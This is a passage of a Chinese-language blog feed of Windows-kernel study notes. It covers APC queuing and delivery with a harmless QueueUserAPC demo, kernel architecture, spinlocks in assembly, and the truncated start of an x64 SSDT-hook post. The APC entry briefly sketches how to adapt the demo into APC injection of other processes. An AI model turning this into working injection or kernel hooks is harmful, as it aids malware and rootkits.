alt="image-20200816195411363"></p><p>检测是否有效后执行SEH</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>APC</title>
    <link href="/2020/08/11/APC/"/>
    <url>/2020/08/11/APC/</url>
    
    <content type="html"><![CDATA[<p>Asyncroneus Procedure Call</p><a id="more"></a><h1 id="什么是APC"><a href="#什么是APC" class="headerlink" title="什么是APC"></a>什么是APC</h1><p>Asyncroneus Procedure Call也就是异步过程调用</p><p><img src="image-20200805112723064.png" alt="image-20200805112723064"></p><p>windbg查看一波，位于kthread+0x34处</p><p><img src="image-20200805112751269.png" alt="image-20200805112751269"></p><p>上图是apc状态结构体成员</p><p>第一个是个双向链表，分为俩个队列，用户态和内核态，所以APC注入也分三环零环</p><p>process是线程所属或挂靠的进程</p><p>下面三都是标志位，第一个表示是否有内核apc函数在运行</p><p>然后是表示是否有内核apc和是否有用户apc正在等待中</p><p><img src="image-20200805114122583.png" alt="image-20200805114122583"></p><p>再来看一下备用APC队列</p><p><img src="image-20200810201936038.png" alt="image-20200810201936038">这个主要是在进程挂靠时起作用，保存原始进程的apc队列</p><p>当进程恢复时再根据备用apc队列恢复原始apc队列</p><p><img src="image-20200810201717250.png" alt="image-20200810201717250"></p><p>这边是ApcStatePointer</p><p>为了操作方便，_KTHREAD结构体中定义了一个指针数组ApcStatePointer ，长度为2。</p><p>正常情况下：<br>    ApcStatePointer[0]  指向 ApcState<br>    ApcStatePointer[1]  指向 SavedApcState</p><p>挂靠情况下：<br>    ApcStatePointer[0]  指向 SavedApcState<br>    ApcStatePointer[1]  指向 ApcState    </p><p><img src="image-20200810202058017.png" alt="image-20200810202058017"></p><p>+0x165 ApcStateIndex用来表示apc状态</p><p>0 正常状态  1 挂靠状态</p><p>结合一下ApcStatePointer可以发现ApcStatePointer[ApcStateIndex]永远表示当前apc队列</p><p><img src="image-20200810202316162.png" alt="image-20200810202316162"></p><p>紧接着他的是ApcQueueable，这用来表示是否能向当前线程插入apc，当线程正在执行退出的代码时，会将这个值设置为0 ，如果此时执行<br>插入APC的代码(KeInsertQueueApc),在插入函数中会判断这个值的状态，如果为0，则插入失败。</p><p>之所以叫apc呢主要是因为当apc执行，一般都是俩个线程A,B</p><p>B线程向A线程中插入APC然后等A线程执行时再执行APC，所以叫异步过程调用</p><p>具体见下</p><p><img src="image-20200812164609526.png" alt="image-20200812164609526"></p><h1 id="APC挂入"><a href="#APC挂入" class="headerlink" title="APC挂入"></a>APC挂入</h1><p><img src="image-20200810203214212.png" alt="image-20200810203214212"></p><p>这边来介绍下APC的挂入过程</p><h2 id="ring3"><a href="#ring3" class="headerlink" title="ring3"></a>ring3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  _In_ PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-function"><span class="hljs-params">  _In_ HANDLE    hThread,</span></span><br><span class="hljs-function"><span class="hljs-params">  _In_ ULONG_PTR dwData</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;   </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;pthreadVC2.lib&quot;</span>)</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">threadproc</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> WINAPI <span class="hljs-title">apcfunc</span><span class="hljs-params">(LPVOID dwParam)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hthread = ::CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)threadproc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>QueueUserAPC((PAPCFUNC)apcfunc, hthread, (DWORD)(PVOID)<span class="hljs-string">&quot;This is APC\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> WINAPI <span class="hljs-title">apcfunc</span><span class="hljs-params">(LPVOID dwParam)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (PVOID)dwParam);<br>&#125;<br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">threadproc</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>SleepEx(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*同理转换下可以注其他程序</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">注意下这边的SleepEx(1000, 1);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">用户模式的APC需要目标线程处在alertable等待状态才能被成功的调度执行*/</span><br></code></pre></td></tr></table></figure><p>一般情况下都选择直接使用QueueUserApc来挂入APC，当然也能用_NtQueueApcThread@20,后者可以不使用IntCallUserApc、换成自己的函数，函数参数也可以有三个了，而PARCFUNC只有一个参数，整体区别不大</p><p><img src="image-20200812160006391.png" alt="image-20200812160006391"></p><h2 id="ring0"><a href="#ring0" class="headerlink" title="ring0"></a>ring0</h2><p>见流程图，首先从KeInitializeApc开始，该函数主要是填充KAPC结构体</p><p>KiInsertQueueApc根据KAPC结构中的ApcStateIndex找到对应的APC队列，再根据KAPC结构中的ApcMode确定是用户队列还是内核队列，将KAPC挂到对应的队列中(挂到KAPC的ApcListEntry处)，再根据KAPC结构中的Inserted置1，标识当前的KAPC为已插入状态，修改KAPC_STATE结构中的KernelApcPending/UserApcPending</p><h1 id="内核APC执行"><a href="#内核APC执行" class="headerlink" title="内核APC执行"></a>内核APC执行</h1><p>既然已经知道APC挂入流程了，现在来康康APC执行</p><p><img src="image-20200812165125835.png" alt="image-20200812165125835"></p><p>系统调用、中断、异常处理时系统都会查看APC队列是否有需要执行的APC，因为每当发生时都会执行KiServiceExit</p><p>下面来逆一波KiServiceExit</p><p><img src="image-20200812174017589.png" alt="image-20200812174017589"></p><p>检查是否有用户apc，有则处理</p><p><img src="image-20200812183050966.png" alt="image-20200812183050966"></p><p>再看看KiDeliverApc</p><p><img src="image-20200812183623033.png" alt="image-20200812183623033"></p><p>这边有个判断内核APC是否为空，不空则跳转</p><p><img src="image-20200812191529622.png" alt="image-20200812191529622"></p><p>然后判断函数地址是否为空，并往栈中填充参数</p><p><img src="image-20200812192455067.png" alt="image-20200812192455067"></p><p>下面就是负责执行内核apc并删除队列恢复状态然后再次循环</p><p><img src="image-20200812183108021.png" alt="image-20200812183108021"></p><p>流程如上，这边注意下ApcState.UserApcPending必须为真，这边就是说明只有可唤醒得线程才会投递APC</p><h1 id="用户APC执行"><a href="#用户APC执行" class="headerlink" title="用户APC执行"></a>用户APC执行</h1><p>用户APC相对内核来说就复杂多了，因为涉及到许多堆栈切换操作</p><p>首先得从内核态到用户态，再到内核态</p><p>而且到用户态不能回到当初进入内核态处，得回到对应apc函数入口</p><p><img src="image-20200812202353445.png" alt="image-20200812202353445"></p><p>具体用户态APC如上，首先判断条件，第一个参数是否为1，是否有用户态apc再执行，用户态apc队列是否为空</p><p>满足条件后讲ApcState.UserApcPending置0然后开始处理，删除队列，释放KAPC结构体内存</p><p>然后开始KiInitializeUserApc</p><p><img src="image-20200812203145476.png" alt="image-20200812203145476"></p><p><img src="image-20200812203213871.png" alt="image-20200812203213871"></p><p>用户空间堆栈完事后开始各种初始化</p><p><img src="image-20200812203303206.png" alt="image-20200812203303206"></p><p>填充寄存器</p><p><img src="image-20200812203326893.png" alt="image-20200812203326893"></p><p>最后让eip指向KeUserApcDispatcher</p><p><img src="image-20200812203452432.png" alt="image-20200812203452432"></p><p>apc处理完后执行_ZwContinue@8返回内核恢复trapframe继续上面得循环判断处理，如没有则恢复trapframe然后回三环原来进0环的地方</p><p><img src="image-20200812203825208.png" alt="image-20200812203825208"></p><p>以后会写APC注入，用户态和内核态的</p><p>用户态的很简单其实，用上面发的代码改一改，注自己线程换成注别的，拿进程pid然后拿线程句柄后写内存然后照搬套路。</p><p>内核态有空写下。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows内核</title>
    <link href="/2020/08/11/Windows%E5%86%85%E6%A0%B8/"/>
    <url>/2020/08/11/Windows%E5%86%85%E6%A0%B8/</url>
    
    <content type="html"><![CDATA[<p>暂未完结~还在更新中</p><a id="more"></a><h1 id="Windows内核"><a href="#Windows内核" class="headerlink" title="Windows内核"></a>Windows内核</h1><h2 id="windows内核中的关键组件"><a href="#windows内核中的关键组件" class="headerlink" title="windows内核中的关键组件"></a>windows内核中的关键组件</h2><h3 id="HAL-硬件抽象层"><a href="#HAL-硬件抽象层" class="headerlink" title="HAL(硬件抽象层)"></a>HAL(硬件抽象层)</h3><p>顾名思义，硬件抽象层主要目的是为了给上层程序提供一个抽象的环境而不需要与硬件直接打交道</p><p>通过hal层访问硬件即可不需要考虑硬件之间的差异，而硬件厂商仅需要提供一个hal</p><h3 id="内核-微内核"><a href="#内核-微内核" class="headerlink" title="内核(微内核)"></a>内核(微内核)</h3><p>微内核即是内核模块ntosknrl.exe中的下层部分，主要负责线程调度和中断，异常处理。对于多处理器还负责同步处理器之间的行为和优化系统性能。</p><p>简而言之内核的功能就是让系统中的所有处理器尽可能高效运行。</p><p>如线程切换，windows线程切换可见之前文章以x86为例寻找调度链表根据优先级进行线程切换</p><h3 id="执行体"><a href="#执行体" class="headerlink" title="执行体"></a>执行体</h3><p>执行体包含五种类型函数</p><p>1.导出的函数，就是一些api，接口在ntdll中通过调用api来执行这些函数</p><p>2.导出且可在用户态使用，但不能通过api调用的函数，如各种查询函数</p><p>3.只能在内核模式下用的函数，在windows ddk中有这些函数的相关文档只需声明下就可用，见ssdt hook代码</p><p>4.为执行体组件中相互调用没有文档化函数</p><p>5.属于某个组件的内部函数</p><p>这边的组件都是执行体内部的组件</p><h3 id="设备驱动程序"><a href="#设备驱动程序" class="headerlink" title="设备驱动程序"></a>设备驱动程序</h3><p>windows内核中除了内核模块ntosknrl.exe和HAL外基本都是设备驱动程序，驱动对我而言就像3环的dll，就是个模块，一个一个贴近虚拟内存中，可以和设备相关也可以完全无关，所有驱动格式都是PE文件格式，至于PE文件格式就不多介绍了，看之前的文章</p><h3 id="系统线程和系统进程"><a href="#系统线程和系统进程" class="headerlink" title="系统线程和系统进程"></a>系统线程和系统进程</h3><p>1.Idle，系统空闲进程，这个之前有提到过，在线程切换拿块，如果调度链表中没有线程那么cpu就会执行idle thread来让cpu空转</p><p>2.system进程，包含内核模式系统线程</p><p>3.会话管理器(smss.exe)，为第一个创建的用户模式进程</p><p>4.登录进程(winlogon.exe)负责处理交互用户的登录和注销</p><p>5.windows子系统进程(csrss.exe)，负责为用户提供子系统环境，包括控制台窗口功能以及创建和删除进程线程</p><p>6.本地安全权威子系统进程(lsass.exe)，负责本地系统安全策略</p><p>7.shell进程(explorer.exe)，windows默认shell，提供系统与用户交互的各种界面</p><p>8.服务控制管理器(services.exe)负责管理windows系统服务，如事件日志，任务调度器和各种网络组件</p><h2 id="Windows内核的基本概念"><a href="#Windows内核的基本概念" class="headerlink" title="Windows内核的基本概念"></a>Windows内核的基本概念</h2><h3 id="处理器模式"><a href="#处理器模式" class="headerlink" title="处理器模式"></a>处理器模式</h3><p>之前在保护模式中讲过这个，段选择子低俩位表示当时所处的特权级，windows只是用了0和3俩个特权级也就是内核和用户俩个模式下，有许多指令只能在0环下才能使用如操作GDT IDT MSR寄存器的指令，当处于3环时，它处于一种相对隔离的状态，能够执行的指令和访问的内存都受限制。一旦超过限制就会触发异常，操作系统捕获异常并进行处理决定是否继续执行，所以操作系统可以保护自己免受用户态代码影响，但是当cpu处于内核态时这种保护就不存在了，一旦捕捉到异常或者指令错误都会系统崩溃(蓝屏)</p><p>同时在不同模式下能访问的地址空间也不一样，三环只能访问当前进程的用户态空间，内核模式中就能访问所有地址空间，而且内核模式下的代码和数据共享，所有进程一旦指令流进入内核，系统地址空间中的代码和数据都是相同的(有个别例外)</p><p>再说一下切换模式的情况</p><p>1.用户态代码触发异常</p><p>2.用户态代码执行时被中断打断(软中断或硬中断)</p><p>3.执行特殊的模式切换指令如快速调用</p><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>简单来说就是段页机制，然而windows并没有段式内存管理方案只是简单将32位虚拟内存空间按照0-4gb的线性地址的空间来看待</p><p>0-2gb是进程私有，2-4gb是系统地址空间是所有进程共享，当然存在某些数据库程序希望私有空间大，就利用了windows的/3gb引导选项这样系统空间就只占用1gb</p><p>再讲讲页</p><p>再系统地址控件重不同区域使用并不完全相同的内存页面管理方法，比较典型的有</p><p>1.非换页内存池，这部分内存区域在初始化时就被映射到物理页面</p><p>2.换页内存池，空闲页面并没有被映射到物理页</p><p>3.系统PTE区域，并非存放PTE而是表示这部分地址范围是以PTE形式来管理的</p><p>进程地址空间是随进程一起被创建的，每个进程都有自己的页目录表(cr3寄存器)，其中一半是共享的，即系统地址空间，其余初始化为0，进程地址空间按照其虚拟地址是否被分配或保留来进行管理，用windows api函数像virtualalloc或virtualfree来申请或释放地址范围，而在内核中有个VAD树来表示进程那2gb内存的使用情况，vad也就是虚拟地址描述符，是一个平衡二叉搜索树。</p><h3 id="进程和线程管理"><a href="#进程和线程管理" class="headerlink" title="进程和线程管理"></a>进程和线程管理</h3><p>进程定义一个执行环境包括它自己的私有地址空间一个句柄表和一个安全环境</p><p>线程就是一个控制流有自己的调用栈记录的他的执行历史</p><p>每个进程至少有1个线程，当然可以有多个，当进程最后一个线程结束时进程也随之结束，windows是一个多进程的操作系统环境，对于处理器资源分配是按照线程来的，可以参照之前的文章</p><p><img src="image-20200805172733850.png" alt="image-20200805172733850"></p><h3 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h3><p>中断是处理器与外部设备打交道的重要途径，异常是处理器的正常指令流在执行的过程中产生的一些特殊事件需要紧急处理才能继续原来的指令流。</p><p>他们都会打断一个正常的指令流，但区别在中断是异步的而异常是同步的</p><p>中断控制器APIC允许设定每一个硬件终端的优先级但是windows并没有使用中断控制器的优先级，而是定义了一套软件中断优先级成为中断请求级别IRQL，处理器在运行时总是有一个当前的IRQL，发生中断时如果中断源的IRQL小于等于当前级别则中断屏蔽，直到遇到高的为止</p><p>IRQL越大优先级越高，当为0时表示普通线程，优先级最低可以被其他中断打断，为1时是APC，也就是异步过程调用，在一个线程中插入一个APC对象可以打断该线程的执行，当为2时是表示处理器正在做线程调度或者选择新的线程，正在处理一个硬件中断的后半部分，被称之为DPC，3-26是设备的IRQL，27-31是一些特殊硬件中断像时钟中断电源中断处理器间中断等。</p><p>延迟过程调用因为设计问题，优先级高于任何一个线程相关的函数，也屏蔽了线程调度同时低于所有硬件中断，所以不会屏蔽他们，之所以被称作延迟过程调用是因为它往往用来执行一些相对高优先级没那么重要的任务，比如更新中断时间，系统时间以及当前线程的时间信息等，并判断系统的定时器数组中是否有定时器到期，有则发出DISPATCH_LEVEL的软中断请求。</p><p>与DPC不同APC是线程相关的例程，当一个线程获取执行权时他的APC会立即被执行，这一特性非常用于实现各种异步通知时间如I/O的完成通知。</p><h2 id="Windows内核中的公共管理设施"><a href="#Windows内核中的公共管理设施" class="headerlink" title="Windows内核中的公共管理设施"></a>Windows内核中的公共管理设施</h2><h3 id="Windows内核中的对象管理"><a href="#Windows内核中的对象管理" class="headerlink" title="Windows内核中的对象管理"></a>Windows内核中的对象管理</h3><p>每一个对象都由俩部分组成，对象头和对象体</p><p>对象头就是object_header，这个在句柄表中有所体现//进程句柄表指向对象头，但全局句柄表就不一样了</p><p><img src="image-20200806145948705.png" alt="image-20200806145948705"></p><p>所有内核对象头都包含了对象管理所需要的基本信息包括对象名称类型引用计数安全描述符等。</p><p>同时每一种对象都需要有一个对应的类型对象</p><p><img src="image-20200806150757137.png" alt="image-20200806150757137"></p><p>对象的生命周期管理是根据引用计数来的，当引用计数为0时会销毁对象</p><h2 id="Windows引导过程"><a href="#Windows引导过程" class="headerlink" title="Windows引导过程"></a>Windows引导过程</h2><p>1.BIOS获取控制权限进行硬件的检测工作然后将控制权转移给操作系统</p><p>2.操作系统获取控制权后先从硬盘的主引导记录开始也就是MBR，MBR寻找引导代码即引导扇区然后将控制权交给引导扇区的代码，windows setup程序再安装时就会填充MBR，引导分区被windows格式化为windows所支持的文件系统，典型的如NTFS和FAT，NTFS是windowsNT的原生文件系统，FAT是MS-DOS时代继承和发展过来的</p><p>引导扇区主要是给windows提供有关该硬盘上卷的结构和格式方面的信息，并从根目录中读取windows的加载程序即ntldr，然后将控制权转交给ntldr入口函数。当然为了做到这些，单个扇区512B无法完成这些功能，为此windows让引导扇区中的代码读入其他扇区中的代码然后跳转到下一个扇区的代码区。</p><p>3.进入ntldr后就是实模式了，实模式处理器的寄存器都是16为直接访问物理内存，ntldr文件主要有俩部分组成，第一个部分是实模式代码，第二个部分是pe文件，这部分被称作os loader，先说说实模式部分，实模式主要负责完成需在16位的环境下执行的初始化工作如清除键盘缓冲区，然后为切换到保护模式做好准备，然后切换到保护模式后将控制权转交给os loader</p><p>os loader获取控制权时虽然已经是保护模式，但还运行在实模式下，虚拟地址转译机制尚未开启，os loader首先把物理内存管理起来，用内存描述符记录并构造页目录和页表，始得16MB一下可以通过页映射来访问，打开页面映射机制后os loader继续执行其他的初始化工作，接着从系统分区读入boot.ini文件并解析，根据引导选项来设置参数，最后加载我们熟悉的内核模块映像文件ntoskrnl.exe，以及HAL映像文件，加载注册表等一些工作做完后把控制权交给ntoskrnl.exe入口</p><p><img src="image-20200811223215032.png" alt="image-20200811223215032"></p><h3 id="内核初始化"><a href="#内核初始化" class="headerlink" title="内核初始化"></a>内核初始化</h3><p><img src="image-20200811223349565.png" alt="image-20200811223349565"></p><p>。。。有点多，书上主要介绍线程进程初始化还有多核情况处理</p><p>具体如上图</p><h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><p>之前写过进程线程的相关东西，其实看起来挺快，书上讲的也不错，这边只记录一些我漏学的小知识，前面作者只是单纯的介绍下进程与线程概念，根据windows调度算法介绍线程是如何被选择的//这些前面的文章都写过，x86就是在32个就绪链表里做选择，这边提到个用户级线程的概念，应该是模拟线程切换把，根据自己的需要自己选择线程的调度算法。后面就是介绍进程与线程结构体中的每一项的成员的意义，这个在之前文章里也写过就不重复了</p><h3 id="windows进程的句柄表"><a href="#windows进程的句柄表" class="headerlink" title="windows进程的句柄表"></a>windows进程的句柄表</h3><p>每当进程利用名称来打开或者创建一个对象的时候都会获取一个句柄，通过句柄可以找到该对象的位置，所以句柄只是个引用，句柄表也分私有和公有，公有的是全局句柄表，每个进程都有一个句柄表，俩个应用程序以共享的方式打开了同一个文件，他们获取的句柄值可能不同，但都能通过该句柄找到文件对象的位置，主要还是因为用的不是一个句柄表。</p><p>那就来康康句柄表在哪</p><p><img src="image-20200813234919654.png" alt="image-20200813234919654"></p><p>首先查看eprocess + 0xc4的地址</p><p><img src="image-20200813234945624.png" alt="image-20200813234945624"></p><p>这个tablecode指向了句柄表//记得低3为清0，表示属性</p><p>假如句柄为0xa 对应值位于tablecode+0xa*2处，因为句柄表中每个成员占8字节</p><p>成员低四字节低三位清零后指向了我们的对象_OBJECT_HEADER</p><p><img src="image-20200814181939008.png" alt="image-20200814181939008"></p><p><img src="image-20200814182017671.png" alt="image-20200814182017671"></p><p>_HANDLE_TABLE结构体每项成员如上图</p><p>其中第一项为tablecode是一个指针，第二位表示句柄表层数</p><p><img src="image-20200814182152731.png" alt="image-20200814182152731"></p><p>句柄表结构如上</p><p>再看看句柄表项内容</p><p><img src="image-20200814183539461.png" alt="image-20200814183539461"></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自旋锁</title>
    <link href="/2020/08/11/%E8%87%AA%E6%97%8B%E9%94%81/"/>
    <url>/2020/08/11/%E8%87%AA%E6%97%8B%E9%94%81/</url>
    
    <content type="html"><![CDATA[<p>多核并发时出现问题怎么解决？</p><a id="more"></a><h1 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h1><p>这边涉及到了多核同步问题</p><p>先简要概述下什么是自旋锁，当一个线程拿到锁后另一个线程占用另一个核跑时也需要拿锁就会判断，然后发现已经有线程拿到锁了就直接做pause操作在那空转，然后再比较。。。如果还占着锁那就不断空转，直到拿到锁。</p><p>来看一看临界区实现</p><p>操作系统在线程切换的时，操作的粒度是指令级别。换句话说就是：线程切换是发生在两个指令中间的，不会在指令执行到一半时被打断，也就是说把读写令牌的指令压缩到一条就可以规避线程同步的问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Start:<br>    mov eax, 1<br>    xchg [令牌], eax<br>    cmp eax, 1<br>    jz GoToSleep<br>    .....<br>    .....<br>    .....<br>    mov [令牌], 0<br>    ret<br><br>GoToSleep:<br>    Sleep(10)<br>    jmp Start<br></code></pre></td></tr></table></figure><p>xchg指令会对“令牌”这块内存和eax进行交换</p><p>1表示在占用0则不是</p><p>这段代码在单核的情况下完全没有问题，但是到了多核就会出现多核并发问题，因为在多核下是多个线程同时在跑，假如又多个线程同时跑xchg [令牌], eax的话，可能多个线程拿到的eax都是0</p><p>所以需要lock指令，这条指令能保证改指令在执行时是互斥的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">Start:<br>    mov eax, 1<br>    lock xchg [令牌], eax<br>    cmp eax, 1<br>    jz GoToSleep<br>    .....<br>    .....<br>    .....<br>    mov [令牌], 0<br>    ret<br><br>GoToSleep:<br>    Sleep(10)<br>    jmp Start<br></code></pre></td></tr></table></figure><p>但是随之而来的另一个问题是当我仅需做少许操作时利用临界区这是一种浪费</p><p>临界区本质上是通过线程切换来实现的线程互斥的效果，这种方式有两个</p><ol><li><p>线程切换本身需要消耗一定的时间，效率低。</p></li><li><p>临界区粒度太大，当我只需要对一小段代码要求互斥，这段代码可能只需要几纳秒就执行完毕了，但线程切换就可能需要20毫秒，得不偿失。<br> 所以需要稍作修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Start:<br>    mov eax, 1<br>    lock xchg [令牌], eax<br>    cmp eax, 1<br>    jz GoToSpin<br>    .....<br>    .....<br>    .....<br>    mov [令牌], 0<br>    ret<br><br>GoToSpin:<br>    pause<br>jmp Start<br></code></pre></td></tr></table></figure><p>这边没用用到sleep cpu就不会主动放弃执行权，等到令牌变为0就可以执行了</p><p>本质上就是个死循环，和名字一样，”自旋”,但是cpu死循环电力消耗大，所以改成pause指令可以降低电力消耗</p></li></ol><p>最后来讲讲弊端</p><p>第一是只能在多核中，如果在单核中跑的话没意义，因为没有线程来恢复令牌</p><p>还有就是适合小操作，如果操作需要耗时太多超过了线程切换周期，与其用自旋锁不如直接sleep让其他线程去跑</p><p>这边让我想起了ssdthook里面需要修改cr0寄存器来改变内存页属性，当时存在核切换情况，那时还不懂以为可以用自旋锁，现在学了才发现并没有什么关系，自旋锁是为了解决多核中线程安全问题而出现的，而我需要的是防止核切换，因为一个核有一套寄存器，所以仅需使用一些特定api即可</p><p>如SetThreadAffinityMask。</p><p>//当然自旋锁从某种角度上来说也能处理，但是不怎么优雅因为要阻塞线程</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSDT HOOK</title>
    <link href="/2020/08/11/SSDT-HOOK/"/>
    <url>/2020/08/11/SSDT-HOOK/</url>
    
    <content type="html"><![CDATA[<p>环境win10 x64，代码已上传github，没有绕patch guard</p><a id="more"></a><h1 id="X64-SSDT-HOOK"><a href="#X64-SSDT-HOOK" class="headerlink" title="X64 SSDT HOOK"></a>X64 SSDT HOOK</h1><p>代码是部分借鉴了Tesla.Angela的教材</p><p>先把代码奉上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 